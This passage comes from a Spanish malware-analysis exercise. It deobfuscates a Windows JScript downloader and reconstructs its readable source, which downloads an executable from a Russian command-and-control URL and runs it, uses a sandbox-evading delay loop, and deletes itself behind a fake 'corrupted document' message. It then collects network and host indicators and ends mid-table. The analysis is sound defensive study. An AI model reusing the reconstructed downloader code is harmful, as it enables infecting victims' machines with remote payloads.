        if(tone==200000000){while(true){try{xhr12[&quot;setOption&quot;](3,&quot;MSXML&quot;);xhr12[&quot;open&quot;](&quot;GET&quot;,pre_from+&quot;&amp;&quot;+Math[&quot;&amp;&quot;floor&quot;](Math[&quot;random&quot;]()*200+1)+&quot;&amp;uid=&quot;+Math[&quot;abs&quot;](pre_following4),false);
        xhr12[&quot;send&quot;]();if(xhr12[&quot;status&quot;]==100+50+50){if(pre_your8[&quot;FileExists&quot;](pre_geolocation6))pre_your8[&quot;DeleteFile&quot;](pre_geolocation6);
        fstream[&quot;Open&quot;]();fstream[&quot;Type&quot;]=1;
        fstream[&quot;Write&quot;](xhr12[&quot;responseBody&quot;]);
        fstream[&quot;Position&quot;]=0
        fstream[&quot;SaveToFile&quot;](pre_geolocation6);
        fstream[&quot;Close&quot;]();filets=pre_your8[&quot;GetFile&quot;](pre_geolocation6)[&quot;OpenAsTextStream&quot;](1)
        if(pre_your8[&quot;FileExists&quot;](pre_geolocation6)&amp;&amp;filets[&quot;ReadLine&quot;]()[&quot;&quot;substring&quot;&quot;](0,2)==&quot;MZ&quot;){pre_mobile7=true;oShell[&quot;ShellExecute&quot;](pre_geolocation6,&quot;&quot;,&quot;&quot;,&quot;open1&quot;)
            if(pre_your8[&quot;FileExists&quot;\u0074&quot;&quot;\u0073&quot;&quot;](WSSS12[&quot;ScriptFullName&quot;&quot;]))pre_your8[&quot;DeleteFile&quot;](WSSS12[&quot;ScriptFullName&quot;])
                WSSS12[&quot;Sleep&quot;&quot;](20*200);if(pre_your8[&quot;FileExists&quot;](pre_geolocation6))pre_your8[&quot;DeleteFile&quot;](pre_geolocation6);
            filets[&quot;Close&quot;]();
            break;
        }filets[&quot;&quot;Close&quot;]();
    }}catch(e){}if(pre_mobile7==true){break;

    }WSSS12[&quot;Sleep&quot;](10000*8);
}break;
}}pre_experienceInformation1=0.619;
pre_collect2=0.826;
pre_interactions4=0.82;
pre_numbers8=0.266;
pre_sent=318;
pre_access=170;
pre_companies=628;
pre_law=100;
pre_PayPal10=164;
pre_PayPal1=0.73;
pre_warningInformation=0.277;
pre_applicable=363;
pre_order=0.951;
pre_receive=412;
pre_information=542;
pre_reason3=759;
pre_conversations8=126;
pre_receive=884;
pre_data6=0.278;
</div></code></pre>
<h4 id="a%C3%B1adir-espacios-donde-falten-en-var"><strong>Añadir espacios donde falten en var</strong></h4>
<p>Por ejemplo en varpre_computer → le falta un espacio: debería ser algo como var pre_computer = ...
Corregimos todos estos espacios en blanco.</p>
<h4 id="renombrar-variables-para-entender-la-l%C3%B3gica"><strong>Renombrar variables para entender la lógica</strong></h4>
<pre class="hljs"><code><div>var ActiveXObject_   = this[&quot;ActiveXObject&quot;];
var WScriptObj       = this[&quot;WScript&quot;];
var shell            = WScriptObj[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
var fso              = new ActiveXObject_(&quot;Scripting.FileSystemObject&quot;);
var stream           = new ActiveXObject_(&quot;ADODB.Stream&quot;);
var shellApp         = new ActiveXObject_(&quot;Shell.Application&quot;);
var tempPath         = shell[&quot;ExpandEnvironmentStrings&quot;](&quot;%TEMP%&quot;);
var targetPath       = tempPath + &quot;\\&quot; +
                       Math[&quot;floor&quot;](Math[&quot;random&quot;]()*(20+20+5+5+25+25)+1) +
                       &quot;.exe&quot;;
var http             = new ActiveXObject_(&quot;Msxml2.ServerXMLHTTP&quot;);
var scriptCopyName   = &quot;\\aflash_update.js&quot;;
var folder3          = shellApp[&quot;NameSpace&quot;](3+2+2);  // carpeta especial

var hasRun       = false;
var executed     = false;
var tone         = 1;
var hash         = 0;
var tmpFile      = null;
var scriptPath   = WScriptObj[&quot;ScriptFullName&quot;];
var autor        = folder3.Self.Path + scriptCopyName;
var remoteUrl    = &quot;https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt&quot;;

</div></code></pre>
<h3 id="limpiar-llamadas-a-los-objetos"><strong>Limpiar llamadas a los objetos</strong></h3>
<p>Vamos a limpiar las llamadas tipo <code>objeto[&quot;metodo&quot;]</code> a <code>objeto.metodo</code>: Para hacerlo aún más legible, vamos sustituyendo por ejemplo <code>shell[&quot;ExpandEnvironmentStrings&quot;]</code> por <code>shell.ExpandEnvironmentStrings</code>. Repetimos con el resto de objetos que nos encontramos en el código.</p>
<div style="page-break-before: always;"></div>
<h3 id="a%C3%B1adimos-identaci%C3%B3n-y-espacios-en-blanco"><strong>Añadimos identación y espacios en blanco</strong></h3>
<pre class="hljs"><code><div>pre_interactions    = null;
pre_including8      = null;
pre_with            = null;
pre_Similar         = null;
pre_customer        = null;
pre_with2           = null;
pre_training2       = null;
pre_provide5        = null;
pre_with            = null;
pre_malicious1      = null;
pre_purposes        = null;
pre_software5       = null;

// INICIALIZACIÖN DE OBJETOS
var ActiveXObject   = this[&quot;ActiveXObject&quot;];
var WScriptObj      = this[&quot;WScript&quot;];
var shell           = WScriptObj.CreateObject(&quot;WScript.Shell&quot;);
var fso             = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)
var stream          = new ActiveXObject(&quot;ADODB.Stream&quot;);
var shellApp        = new ActiveXObject(&quot;Shell.Application&quot;);

// RUTAS Y CONFIGURACIÓN
var tempPath        = shell.ExpandEnvironmentStrings(&quot;%TEMP%&quot;)
var targetPath      = tempPath+&quot;\\&quot; + Math.ramdom () * (20+20+5+5+25+25)+1 + &quot;.exe&quot;;
var http            = new ActiveXObject(&quot;Msxml2.ServerXMLHTTP&quot;)
var scriptCopyName  = &quot;\\aflash_update.js&quot;
var folder          = shellApp.NameSpace(3+2+2);
var hasRun          = false;
var executed        = false;
var tone            = 1;
var hash            = 0;
var pre_information = 0;
var tmpFile         = null;
var shellString     = &quot;&quot;;
var scriptPath      = WScriptObj.ScriptFullName;
var autor           = folder.Self.Path+scriptCopyName;
var pre_overheard   = autor;
var tempPath        = &quot;https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt&quot;;


// LOGICA DE PERSISTENCIA
if (scriptPath !=autor &amp;&amp; hasRun == false){
    hasRun=true;
    fso.DeleteFile(scriptPath); // Se borra a sí mismo
    WScriptObj.echo(&quot;he document is corrupted an\d cannot be opened&quot;)
    WScriptObj.Sleep(5000);
}

// ALGORTIMO DE HASHING - IDENTIFICADOR UNICO
for (pre_information=0; pre_information&lt;pre_overheard.length; pre_information++){
    hash=((hash&lt;&lt;5) - hash + pre_overheard.charCodeAt(pre_information)) &amp; 0xffffffff;
}


// BUCLE PRINCIPAL
while(true){
    tone = tone + 1
    
    if ( tone == 200000000 ) {
        while (true) {
            try{
                http.setOption(3,&quot;MSXML&quot;);
                http.open(
                    &quot;GET&quot;,
                    tempPath + &quot;&amp;&quot; + Math.floor(Math.random() * 200+1) + &quot;&amp;uid=&quot;+Math.abs(hash),
                    false);
                http.send();
                
                if ( http.status == 100+50+50){
                    if ( fso.FileExists(targetPath) ) {
                        fso.DeleteFile(targetPath);
                }

                stream.Open();
                stream.Type=1;
                stream.Write(http.responseBody);
                stream.Position=0
                stream.SaveToFile(targetPath);
                stream.Close();
                
                tmpFile = fso.GetFile(targetPath).OpenAsTextStream(1)
        
                if (fso.FileExists(targetPath) &amp;&amp; tmpFile.ReadLine().substring(0,2) == &quot;MZ&quot;) {
                    executed=true;
                    shellApp.ShellExecute(targetPath,&quot;&quot;,&quot;&quot;,&quot;open1&quot;)
            
                    if (fso.FileExists(WScriptObj.ScriptFullName)) {
                        fso.DeleteFile(WScriptObj.ScriptFullName)
                    }
                    
                    WScriptObj.Sleep(20*200);
                    
                    if(fso.FileExists(targetPath)) {
                        fso.DeleteFile(targetPath);
                    }

                    tmpFile.Close();
            
                    break;
                }
                tmpFile.Close();
    
            }
        }catch(e){ 

        }
        
        if(executed==true){
            break;
        }

        WScriptObj.Sleep(10000*8);
        }
        break;
    }
}

pre_experienceInformation1=0.619;
pre_collect2=0.826;
folder=0.82;
pre_numbers8=0.266;
pre_sent=318;
pre_access=170;
pre_companies=628;
pre_law=100;
pre_PayPal10=164;
pre_PayPal1=0.73;
pre_warningInformation=0.277;
pre_applicable=363;
pre_order=0.951;
pre_receive=412;
pre_information=542;
pre_reason3=759;
pre_conversations8=126;
pre_receive=884;
pre_data6=0.278;
</div></code></pre>
<div style="page-break-before: always;"></div>
<h2 id="analisis-del-comportamiento-del-malware"><strong>Analisis del comportamiento del malware</strong></h2>
<p>Basándonos en el código que hemos desofuscado y reconstruido podemos determinar que este script es un Downloader/Dropper (Descargador). Su único propósito es servir de puerta de entrada para infectar el equipo con otro virus más peligroso.</p>
<ul>
<li><strong>Comportamiento:</strong> Al ejecutarse, muestra un mensaje de error falso: <code>The document is corrupted and cannot be opened</code>. Usa Ingeniería Social --&gt; Engaño.</li>
<li><strong>Objetivo:</strong> Hacer creer a la víctima que el archivo simplemente estaba roto, para que no sospeche que hay un script ejecutándose en segundo plano.</li>
</ul>
<h3 id="persistencia---auto-instalaci%C3%B3n"><strong>Persistencia - Auto-instalación</strong></h3>
<pre class="hljs"><code><div>if (scriptPath !=autor &amp;&amp; hasRun == false){
    hasRun=true;
    fso.DeleteFile(scriptPath); // Se borra a sí mismo
    WScriptObj.echo(&quot;he document is corrupted an\d cannot be opened&quot;)
    WScriptObj.Sleep(5000);
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>Comprueba si:
<ul>
<li>el script no se está ejecutando desde la ruta <code>objetivo</code> <code>(scriptPath != autor)</code>, y</li>
<li>este bloque aún no se ha ejecutado en esta sesión <code>(hasRun == false)</code>.</li>
</ul>
</li>
<li>Se borra a sí mismo.</li>
<li>Engaña al usuario con un mensaje.</li>
<li>Espera 5 segundos y luego el script continúa con el resto de la lógica (descargar ejecutable, etc.).</li>
</ul>
<p><strong>Comportamiento:</strong></p>
<ul>
<li>Verifica si se está ejecutando desde la carpeta de Inicio de Windows (Startup).</li>
<li>Si no está ahí, su intención es copiarse a sí mismo en esa carpeta bajo el nombre <code>flash_update.js</code>.</li>
</ul>
<p><strong>Objetivo:</strong> Asegurarse de que el virus se ejecute automáticamente cada vez que la víctima encienda el ordenador. Usa el nombre <code>Flash Update</code> para parecer legítimo si alguien revisa esa carpeta.</p>
<h3 id="huella-digital-fingerprinting"><strong>Huella Digital, Fingerprinting</strong></h3>
<pre class="hljs"><code><div>for (pre_information=0; pre_information&lt;pre_overheard.length; pre_information++){
    hash=((hash&lt;&lt;5) - hash + pre_overheard.charCodeAt(pre_information)) &amp; 0xffffffff;
}
</div></code></pre>
<p><strong>Comportamiento:</strong> Genera un identificador único (<code>uid</code>) basado en un hash de la ruta donde está instalado el archivo.</p>
<p><strong>Objetivo:</strong> Identificar a cada víctima de forma única ante el servidor del atacante. Así se sabe cuántas máquinas se han infectado y si una petición viene de una máquina nueva o repetida.</p>
<h3 id="evasi%C3%B3n-de-antivirus---anti-sandbox"><strong>Evasión de Antivirus - Anti-Sandbox</strong></h3>
<p><strong>Bucle infinito exterior:</strong></p>
<pre class="hljs"><code><div>while (true) {
    tone = tone + 1;
    ...
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>No hace nada “útil” hasta que tone alcanza un valor concreto.</li>
</ul>
<p><strong>Cuando <code>tone == 200000000</code></strong></p>
<pre class="hljs"><code><div>if (tone == 200000000) {
    while (true) {
        ...
    }
    break;
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>Cuando <code>tone</code> llega a <code>200000000</code>, entra en otro bucle infinito interno.</li>
<li>Después de que ese bucle interno termine, hace <code>break;</code> y sale del bucle exterior.</li>
</ul>
<p><strong>Comportamiento:</strong> Ejecuta un bucle <code>while</code> que cuenta hasta 200.000.000 antes de hacer nada malicioso.</p>
<p><strong>Objetivo:</strong> Engañar a los sistemas de análisis automático (Sandboxes). Muchos antivirus ejecutan un archivo sospechoso durante unos segundos en un entorno aislado para ver qué hace. Como este script se pasa los primeros sin hacer NADA, el antivirus piensa que es inofensivo y lo puede dejar pasar. O si lo ejecutamos en plataformas como ANY.RUN, dado que la versión gratuita tiene un límite de tiempo para el análisis, podría provocar que el análisis finalice antes de que se active el código malicioso, debido al bucle de retardo.</p>
<div style="page-break-before: always;"></div>
<h3 id="conexi%C3%B3n-con-el-servidor-de-mando-y-control-c2"><strong>Conexión con el Servidor de Mando y Control C2</strong></h3>
<p><strong>Dentro del <code>while (true)</code> interno:</strong></p>
<pre class="hljs"><code><div>try {
    http.setOption(3, &quot;MSXML&quot;);
    http.open(&quot;GET&quot;, tempPath + &quot;&amp;&quot; + Math.floor(Math.random()*200+1) + &quot;&amp;uid=&quot; + Math.abs(hash), false);
    http.send();
</div></code></pre>
<p>donde:</p>
<ul>
<li>Configura un objeto <code>HTTP</code>.</li>
<li>Hace una petición <code>GET</code> a una URL construida a partir de:
<ul>
<li><code>tempPath</code> que realmente es una URL base,</li>
<li>un número aleatorio,</li>
<li>y un <code>uid</code> único basado en hash que vimos en el apartado de Fingerprinting.</li>
</ul>
</li>
</ul>
<p><strong>Comportamiento:</strong> Realiza una petición web <code>(HTTP GET) a la IP 217.28.218.217</code>.</p>
<p><strong>Objetivo:</strong> Contactar con el atacante y descargar la carga dañina (payload).</p>
<h3 id="descarga-y-validaci%C3%B3n-del-malware"><strong>Descarga y Validación del Malware</strong></h3>
<p><strong>Si la respuesta es “correcta” (código 200):</strong></p>
<pre class="hljs"><code><div>if (http.status == 100 + 50 + 50) { // 200
    if (fso.FileExists(targetPath)) fso.DeleteFile(targetPath);

    stream.Open();
    stream.Type = 1;
    stream.Write(http.responseBody);
    stream.Position = 0;
    stream.SaveToFile(targetPath);
    stream.Close();

    tmpFile = fso.GetFile(targetPath).OpenAsTextStream(1);
</div></code></pre>
<p>donde:</p>
<ul>
<li>Comprueba que status es <code>200</code>.</li>
<li>Si ya existía un fichero en <code>targetPath</code>, lo borra.</li>
<li>Abre un stream binario, escribe en él el cuerpo de la respuesta (<code>responseBody</code>).</li>
<li>Lo guarda en disco en <code>targetPath</code>.</li>
<li>Cierra el stream y vuelve a abrir el fichero como texto (<code>tmpFile</code>).</li>
</ul>
<div style="page-break-before: always;"></div>
<p><strong>Comprueba si el fichero parece un ejecutable PE:</strong></p>
<pre class="hljs"><code><div>if (fso.FileExists(targetPath) &amp;&amp;
    tmpFile.ReadLine().substring(0, 2) == &quot;MZ&quot;) {
    
    executed = true;
    shellApp.ShellExecute(targetPath, &quot;&quot;, &quot;&quot;, &quot;open1&quot;);
    ...
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>Verifica que el fichero existe.</li>
<li>Lee la primera línea y mira si los dos primeros caracteres son <code>MZ</code>.</li>
<li><code>MZ</code> es la firma típica de un ejecutable de Windows (formato PE).</li>
<li>Si se cumple:
<ul>
<li>Marca <code>executed = true</code>.</li>
<li>Lanza ese fichero con <code>ShellExecute</code>. Lo ejecuta.</li>
</ul>
</li>
</ul>
<p><strong>Comportamiento:</strong></p>
<ul>
<li>Descarga un archivo binario y lo guarda en la carpeta temporal (<code>%TEMP%</code>) con un nombre numérico aleatorio.</li>
<li>Validación <code>MZ</code>: Lee los dos primeros caracteres del archivo descargado. Si son <code>MZ</code>, confirma que es un ejecutable de Windows válido.</li>
</ul>
<p><strong>Objetivo:</strong> Asegurarse de que la descarga no falló ni fue interceptada por un firewall antes de intentar ejecutarla.</p>
<h3 id="ejecuci%C3%B3n-y-limpieza"><strong>Ejecución y Limpieza</strong></h3>
<p><strong>Borrado del propio script y del fichero descargado:</strong></p>
<pre class="hljs"><code><div>if (fso.FileExists(WScriptObj.ScriptFullName))
    fso.DeleteFile(WScriptObj.ScriptFullName);

WScriptObj.Sleep(20 * 200);

if (fso.FileExists(targetPath))
    fso.DeleteFile(targetPath);

tmpFile.Close();
break;
</div></code></pre>
<p>donde:</p>
<ul>
<li>Intenta borrar el fichero del propio script (<code>ScriptFullName</code>).</li>
<li>Espera un rato (<code>Sleep</code>).</li>
<li>Borra también el fichero descargado (<code>targetPath</code>), si existe.</li>
<li>Cierra el <code>tmpFile</code> y hace <code>break;</code> para salir del bucle interno.</li>
</ul>
<p><strong>Comportamiento:</strong></p>
<ul>
<li>Usa <code>ShellExecute</code> para arrancar el <code>.exe</code> descargado.</li>
<li>Intenta borrar el script <code>.js</code> original y el <code>.exe</code> descargado para eliminar evidencias.</li>
</ul>
<p><strong>Resultado final:</strong> El script de JavaScript termina su trabajo y deja el control al nuevo ejecutable descargado que podría ser, un Ransomware, un troyano bancario o un software de espionaje.</p>
<h3 id="si-falla-o-no-se-ejecuta-nada"><strong>Si falla o no se ejecuta nada</strong></h3>
<pre class="hljs"><code><div>} catch (e) {}

if (executed == true) {
    break;
}

WScriptObj.Sleep(10000 * 8);
</div></code></pre>
<p>donde:</p>
<ul>
<li>Si pasa una excepción en la descarga/escritura, se ignora.</li>
<li>Si <code>executed == true</code>, sale del bucle interno.</li>
<li>Si no se ha conseguido ejecutar el archivo:
<ul>
<li>espera unos segundos (<code>Sleep(80000)</code>),</li>
<li>y vuelve a intentar la descarga en el mismo <code>while(true)</code> interno.</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h2 id="extracci%C3%B3n-los-iocs">Extracción los IOCs</h2>
<h3 id="indicadores-de-red---network-indicators"><strong>Indicadores de Red - Network Indicators</strong></h3>
<p><strong>Investigamos un poco sobre esa IP:</strong></p>
<pre class="hljs"><code><div>whois 217.28.218.217
<span class="hljs-meta">%</span><span class="bash"> This is the RIPE Database query service.</span>
<span class="hljs-meta">%</span><span class="bash"> The objects are <span class="hljs-keyword">in</span> RPSL format.</span>
<span class="hljs-meta">%</span>
<span class="hljs-meta">%</span><span class="bash"> The RIPE Database is subject to Terms and Conditions.</span>
<span class="hljs-meta">%</span><span class="bash"> See https://docs.db.ripe.net/terms-conditions.html</span>
<span class="hljs-meta">
%</span><span class="bash"> Note: this output has been filtered.</span>
<span class="hljs-meta">%</span><span class="bash">       To receive output <span class="hljs-keyword">for</span> a database update, use the <span class="hljs-string">"-B"</span> flag.</span>
<span class="hljs-meta">
%</span><span class="bash"> Information related to <span class="hljs-string">'217.28.218.192 - 217.28.218.223'</span></span>
<span class="hljs-meta">
%</span><span class="bash"> Abuse contact <span class="hljs-keyword">for</span> <span class="hljs-string">'217.28.218.192 - 217.28.218.223'</span> is <span class="hljs-string">'abuse@domru.ru'</span></span>

inetnum:        217.28.218.192 - 217.28.218.223
netname:        ARFU-NET
country:        RU
admin-c:        SM3227-RIPE
tech-c:         SK4292-RIPE
status:         ASSIGNED PA
mnt-by:         JSC-TELENET-MNT
created:        2017-07-05T07:15:06Z
last-modified:  2017-07-13T10:26:04Z
source:         RIPE

person:         Tech Admin Telenet
address:        14 build 3,
address:        Mazhorov Side Str.,
address:        Moscow, Russia, 105023
phone:          +7 495 7857100
fax-no:         +7 495 7772333
nic-hdl:        SK4292-RIPE
mnt-by:         JSC-TELENET-MNT
created:        2008-10-10T14:20:03Z
last-modified:  2018-11-27T12:11:36Z
source:         RIPE # Filtered

person:         Sergey Matral
address:        14 build 3, Mazhorov Side Str., Moscow, Russia, 107023
phone:          +7 495 7254112
nic-hdl:        SM3227-RIPE
mnt-by:         ru-okbprogress-1-mnt
created:        2002-08-26T10:23:12Z
last-modified:  2018-09-25T16:16:30Z
source:         RIPE # Filtered
<span class="hljs-meta">
%</span><span class="bash"> Information related to <span class="hljs-string">'217.28.216.0/22AS29053'</span></span>

route:          217.28.216.0/22
descr:          Routing Block#2 Telenet (Moscow)
origin:         AS29053
mnt-by:         JSC-TELENET-MNT
created:        2007-11-20T13:07:11Z
last-modified:  2007-11-20T13:07:11Z
source:         RIPE
<span class="hljs-meta">
%</span><span class="bash"> Information related to <span class="hljs-string">'217.28.216.0/22AS31363'</span></span>

route:          217.28.216.0/22
descr:          JSC "ER-Telecom Holding" Moscow branch
descr:          Moscow, Russia
origin:         AS31363
mnt-by:         RAID-MNT
created:        2022-11-24T05:32:24Z
last-modified:  2022-11-24T05:32:24Z
source:         RIPE
<span class="hljs-meta">
%</span><span class="bash"> This query was served by the RIPE Database Query Service version 1.120 (BUSA)</span>
</div></code></pre>
<p>donde:</p>
<ul>
<li>La IP 217.28.218.217 está dentro del bloque 217.28.218.192/27 (192–223).</li>
<li>country: RU → el bloque está registrado en Rusia.</li>
<li>netname: ARFU-NET → nombre lógico del bloque (suele ser un cliente o subred concreta).</li>
<li>ASSIGNED PA → es espacio “Provider Aggregatable” asignado por el proveedor, no un bloque independiente de un cliente grande.</li>
<li>El bloque está gestionado por JSC Telenet / JSC &quot;ER-Telecom Holding&quot;, un ISP ruso con sede en Moscú.</li>
<li>La dirección física en el WHOIS corresponde a Moscú.</li>
<li>El contacto de abuso (a quien escribir si reportas actividad maliciosa) es: <code>abuse@domru.ru</code></li>
<li>No prueba que ahora mismo haya un host encendido en esa IP.</li>
<li>La IP pertenece a un rango real,</li>
<li>Está bajo la responsabilidad de el ISP ruso (JSC &quot;ER-Telecom Holding&quot;, Moscú).</li>
</ul>
<p><strong>Resumiendo:</strong> La IP 217.28.218.217 pertenece al rango 217.28.218.192–223 (netname ARFU-NET), registrado en Rusia y gestionado por el ISP JSC 'ER-Telecom Holding' (Moscú).</p>
<div style="page-break-before: always;"></div>
<p><strong>Probamos con VirusTotal a ver qué nos cuenta de esa IP:</strong></p>
<p><img src="capturas/virus-total.png" alt="virus-total"></p>
<p><strong>Probamos con traceroute:</strong></p>
<pre class="hljs"><code><div>traceroute 217.28.218.217
traceroute to 217.28.218.217 (217.28.218.217), 30 hops max, 60 byte packets
 1  _gateway (10.0.2.2)  0.678 ms  0.614 ms  0.589 ms
 2  192.168.144.1 (192.168.144.1)  5.019 ms  4.995 ms  4.967 ms
 3  * * *
 4  * * *
 5  10.255.180.78 (10.255.180.78)  8.534 ms  8.512 ms  8.487 ms
 6  10.34.205.1 (10.34.205.1)  22.311 ms  15.284 ms  15.257 ms
 7  10.34.206.57 (10.34.206.57)  17.951 ms 10.34.206.61 (10.34.206.61)  14.618 ms  14.589 ms
 8  193.251.247.13 (193.251.247.13)  18.637 ms  18.624 ms  18.613 ms
 9  193.251.150.76 (193.251.150.76)  18.602 ms 193.251.129.16 (193.251.129.16)  18.589 ms 193.251.150.76 (193.251.150.76)  20.323 ms
10  prs-bb2-link.ip.twelve99.net (62.115.123.220)  57.810 ms 193.251.150.76 (193.251.150.76)  20.295 ms prs-bb2-link.ip.twelve99.net (62.115.123.220)  82.849 ms
11  ffm-bb2-link.ip.twelve99.net (62.115.122.139)  46.710 ms  78.701 ms  78.665 ms
12  ffm-bb2-link.ip.twelve99.net (62.115.122.139)  78.649 ms sto-bb2-link.ip.twelve99.net (62.115.138.104)  78.618 ms  78.603 ms
13  mow-b5-link.ip.twelve99.net (62.115.141.23)  89.340 ms sto-bb2-link.ip.twelve99.net (62.115.138.104)  77.015 ms mow-b5-link.ip.twelve99.net (62.115.141.23)  88.528 ms
14  ertelekom-ic-393966.ip.twelve99-cust.net (213.248.90.211)  88.482 ms mow-b5-link.ip.twelve99.net (62.115.141.23)  88.455 ms  88.430 ms
15  ertelekom-ic-393965.ip.twelve99-cust.net (213.248.104.255)  90.609 ms  90.506 ms  89.663 ms
16  176x213x132x18.static-business.msk.ertelecom.ru (176.213.132.18)  85.236 ms * 176x213x132x30.static-business.msk.ertelecom.ru (176.213.132.30)  86.795 ms
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
</div></code></pre>
<p>donde:</p>
<ul>
<li>Saltos 1–2 (10.0.2.2, 192.168.144.1): 10.0.2.2 es la puerta de enlace predeterminada de VirtualBox. 192.168.144.1 es el router de mi red.</li>
<li>Saltos 3–4: * * *: Routers intermedios que no responden a los mensajes “TTL exceeded”.</li>
<li>Saltos 5–7 (10.255.x.x, 10.34.x.x): Más IPs privadas → red interna del ISP (carrier-grade NAT, backbone interno).</li>
<li>Hasta aquí: simplemente estamos saliendo de mi red hacia el operador.</li>
<li>Saltos 8–9 – 193.251.x.x: Routers públicos de un backbone europeo.</li>
<li>Saltos 10–13 – *.ip.twelve99.net. Routers de Twelve99 (antes Telia), un operador Tier-1. Los nombres dan pistas:
<ul>
<li>prs-bb2 → backbone en París,</li>
<li>ffm-bb2 → backbone en Fráncfort,</li>
<li>sto-bb2 → backbone en Estocolmo,</li>
<li>mow-b5 → backbone en Moscú.</li>
</ul>
</li>
<li>Hasta aquí: mi tráfico está cruzando Europa hasta Moscú.</li>
<li>Saltos 14–15 – ertelekom-ic-....twelve99-cust.net: Son los puntos de interconexión donde Twelve99 entrega el tráfico al cliente ER-Telecom (el mismo que te salía en el WHOIS).</li>
<li>Salto 16 – 176x213x132x18/30.static-business.msk.ertelecom.ru. Son routers dentro de la red de ER-Telecom en Moscú (msk).</li>
<li>A partir de aquí, estamos claramente dentro de la red del ISP ruso donde vive el rango 217.28.216.0/22 que incluye la IP.</li>
<li>Saltos 17–21 – * * *: Los paquetes llegan hasta el proveedor de internet en Moscú, pero justo antes de llegar al servidor final (217.28.218.217), se pierden.</li>
</ul>
<p><strong><mark>Esa IP no responde a traceroute ni a ping.</mark></strong> El hecho de que muera después puede deberse a:</p>
<ul>
<li>Opción A: Hay un Firewall delante del servidor que bloquea todo el tráfico de diagnóstico (ICMP/UDP) para ocultarse.</li>
<li>Opción B: El servidor ha sido desconectado (&quot;Taken down&quot;) por el proveedor de internet debido a denuncias de abuso, pero la ruta hacia la red del proveedor sigue activa.</li>
</ul>
<div style="page-break-before: always;"></div>
<p><strong>Hacemos un escaneo ligero con nmap:</strong><br>
La opción -Pn indica que no confíe en ping y pruebe directamente los puertos.</p>
<pre class="hljs"><code><div>nmap -Pn -p 80,443,8080 217.28.218.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 19:44 CET
Nmap scan report for 217x28x218x217.static-business.msk.ertelecom.ru (217.28.218.217)
Host is up.

PORT     STATE    SERVICE
80/tcp   filtered http
443/tcp  filtered https
8080/tcp filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
usuario@usuario-1-2:~/Escritorio/M3-Ejercicio6$ 
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>Nmap scan report for 217x28x218x217.static-business.msk.ertelecom.ru</code>:
<ul>
<li>msk: Moscú.</li>
<li>ertelecom: El ISP ruso.</li>
<li>static-business: Confirma que es una IP estática empresarial, típica de servicios de hosting o VPS. No es la conexión doméstica, es infraestructura alquilada.</li>
</ul>
</li>
<li>El Estado de los Puertos: filtered. Silencio absoluto. Nmap envió paquetes solicitando entrar, pero nadie respondió. Los paquetes fueron &quot;tirados a la basura&quot; (dropped). Esto indica la presencia de un Firewall intermedio o una regla de enrutamiento que está bloqueando todo el tráfico entrante hacia esa IP. <mark>No es que el servicio web esté apagado (si fuera así, daría closed), es que la &quot;carretera&quot; hacia ese servidor ha sido cortada</mark>.</li>
<li><strong></mark>Se bloquea TODO el tráfico TCP hacia los puertos de servicio.</mark></strong></li>
</ul>
<p><strong>Conclusión sobre la ip de este ejercicio</strong>:<br>
Hay indicios de que la IP 217.28.218.217 corresponde a un host en una red activa (no es una IP huérfana), pero los puertos típicos de HTTP/HTTPS (80, 443, 8080) están filtrados por un firewall. No se puede determinar si el servicio C2 sigue operativo en esos puertos, o si solo acepta conexiones en otras condiciones (otros puertos, reglas específicas, horario, listas blancas, etc.).</p>
<div style="page-break-before: always;"></div>
<p><strong>Resumen de IOCs de Red:</strong></p>
<table>
<thead>
<tr>
<th>Tipo</th>
<th>Valor</th>
<th>Contexto / Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>IP C2</td>
<td>217.28.218.217</td>
<td>Dirección IP del Servidor de Comando y Control.</td>
</tr>
<tr>
<td>Alojamiento de la IP</td>
<td>ISP ruso (JSC &quot;ER-Telecom Holding&quot;, Moscú)</td>
<td></td>
</tr>
<tr>
<td>Contacto de abuso registrado</td>
<td>abuse@domru.ru</td>
<td></td>
</tr>
<tr>
<td>URL Completa</td>
<td>https://217.28.218.217/NOPE/q64.php</td>
<td>Ruta específica donde se aloja el payload malicioso.</td>
</tr>
<tr>
<td>Parámetro URL</td>
<td>?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt</td>
<td>Cadena de consulta hardcodeada. Muy útil para reglas de detección en Proxy/Firewall.</td>
</tr>
<tr>
<td>Protocolo</td>
<td>HTTPS (Port 443)</td>
<td>Usa SSL para ocultar el tráfico (Msxml2.ServerXMLHTTP).</td>
</tr>
</tbody>
</table>
<h3 id="indicadores-de-host---host-based-indicators"><strong>Indicadores de Host - Host-based Indicators</strong></h3>
<p>Rastros físicos que deja el malware en el disco duro de la víctima.</p>
<table>
<thead>
<tr>
<th>Tipo</th>
<th>Valor / Patrón</th>
<th>Ubicación</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nombre de Archivo</td>
<td>flash_update.js</td>
<td>Carpeta de Inicio (Startup)</td>
<td>Nombre que usa para la persistencia. Intenta hacerse pasar por una actualización de Adobe Flash.</td>
</tr>
<tr>
<td>Patrón de Archivo</td>
<td>&quot;\d+.exe (Ej: 45.exe, 102.exe)&quot;</td>
<td>%TEMP%</td>
<td>El payload descargado se guarda con un nombre numérico aleatorio en la carpeta temporal.</td>
</tr>
<tr>
<td>Firma Mágica</td>
<td>MZ (0x4D 0x5A)</td>
<td>Cabecera del archivo</td>
<td>El script busca explícitamente estos bytes al inicio del archivo descargado para confirmar que es un ejecutable.</td>
</tr>
</tbody>
</table>
<div style="page-break-before: always;"></div>
<h3 id="ioc-de-contenido---cadenas---strings"><strong>IoC de contenido - cadenas - strings</strong></h3>
<p>Los IoC de Contenido (o String IoCs) son cadenas de texto específicas dentro del cuerpo del malware que sirven como &quot;huellas dactilares&quot;.</p>
<table>
<thead>
<tr>
